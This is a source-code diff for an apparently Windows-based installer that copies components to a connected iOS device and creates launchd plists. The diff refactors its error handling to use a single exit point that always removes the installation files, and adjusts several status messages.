@@ -164,7 +164,8 @@ UINT install_files(char *lpath, char **dir_content)
 UINT install_run(LPVOID lp)
 {	
   int i = 0;
- 
+  int retval = 0;
+
   if (bIsDeviceConnected == FALSE)
     return 0;
   
@@ -180,13 +181,13 @@ UINT install_run(LPVOID lp)
   if (dir_content[0] == NULL)
   {
     dlg->setMessage("cannot found installation component!");
-    return 0;
+    goto exit_point;
   }
   
   if (make_install_directory() != 0)
   {
     dlg->setMessage("cannot create installation folder!");
-	return 0;
+	goto exit_point;
   }
 
   dlg->setMessage("copy files...");
@@ -194,7 +195,7 @@ UINT install_run(LPVOID lp)
   if (install_files(gIosInstallationDirectory, dir_content) != 0)
   {
     dlg->setMessage("cannot copy files into installation folder!");
-	return 0;
+	goto exit_point;
   }
 
   dlg->setMessage("copy files... done.");
@@ -202,7 +203,7 @@ UINT install_run(LPVOID lp)
   if (create_launchd_plist() != 0)
   {
    dlg->setMessage("cannot create plist files!");
-   return 0;
+   goto exit_point;
   }
 
   dlg->setMessage("try to restart device...");
@@ -211,7 +212,7 @@ UINT install_run(LPVOID lp)
   {
     dlg->setDeviceImage(IDB_BITMAP_GRAYED);
     dlg->setMessage("try to restart device...restarting: please wait.");
-    dlg->setInfo("no device connected");
+    //dlg->setInfo("no device connected");
   }
   else 
   {
@@ -232,7 +233,7 @@ UINT install_run(LPVOID lp)
   } while(isDeviceOn == 1);
   
   dlg->setDeviceImage(IDB_BITMAP_GRAYED);
-  dlg->setInfo("device disconnected. Please wait...");
+  dlg->setMessage("device disconnected. Please wait...");
   resetDeviceInfo();
   dlg->setInfo(info);
 
@@ -255,8 +256,14 @@ UINT install_run(LPVOID lp)
   Sleep(10);
 
   dlg->setMessage("checking installation...");
+  
+  retval = check_installation(10, 10);
 
-  if (check_installation(10, 10) == 1)
+exit_point:
+
+  remove_installation();
+
+  if (retval == 1)
   {
 	dlg->setMessage("installation done!");
   }
@@ -264,8 +271,6 @@ UINT install_run(LPVOID lp)
   {
 	dlg->setMessage("installation failed: please retry!");
   }
-  
-  remove_installation();
   
   return 0;
 }
@@ -301,6 +306,7 @@ UINT isDeviceAttached(LPVOID lp)
 			((CinstallDlg *)lp)->setMessage("check device... device is ready.");
 		} else {
 			((CinstallDlg *)lp)->setMessage("check device... installation detected!");
+			 remove_installation();
 		}
 
 		bIsDeviceConnected = 1;
